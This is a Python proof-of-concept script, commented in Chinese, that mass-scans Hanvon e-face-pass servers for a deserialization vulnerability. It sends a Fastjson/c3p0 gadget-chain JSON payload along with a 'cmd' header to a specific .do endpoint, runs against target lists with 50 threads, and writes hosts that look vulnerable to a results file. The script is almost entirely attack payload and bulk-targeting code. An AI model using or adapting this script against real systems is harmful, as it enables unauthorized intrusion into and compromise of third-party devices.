import argparse,requests,re,sys,json
from multiprocessing.dummy import Pool

# 关闭 HTTPS 警告
requests.packages.urllib3.disable_warnings()

def banner():
    test = """"""
    print(test)
    print("[*] 汉王 e脸通 addVisitDeviceAppointmentInfoTest 反序列化漏洞检测脚本")

def poc(target):
    url1 = "/manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS"
    headers = {
        "Content-Type": "application/json",
        "cmd": "echo {{randomstr}} "
    }

    payload = {
    "e": {
        "@type": "java.lang.Class",
        "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    },
    "f": {
        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "userOverridesAsString": "HexAsciiSerializedMap:;"
    }
}

    try:
        res = requests.post(url=target+url1, headers=headers, data=json.dumps(payload), timeout=5, verify=False)
        # 根据返回内容判断是否存在漏洞
        if res.status_code == 200 and re.search(r"exception|error|java\.lang", res.text, re.I):
            print(f"[+]{target} 可能存在反序列化漏洞")
            with open('zy4result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 未发现明显漏洞")
    except Exception as e:
        print(f"[ERROR]{target} -> {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="汉王 e脸通 addVisitDeviceAppointmentInfoTest 反序列化漏洞检测")

    parser.add_argument('-u','--url',dest='url',type=str,help="单个目标URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="批量目标文件，每行一个URL")
    
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = [line.strip() for line in open(args.file,'r',encoding='utf-8') if line.strip()]
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usage: Python {sys.argv[0]} -h")

if __name__ == "__main__":
    main()

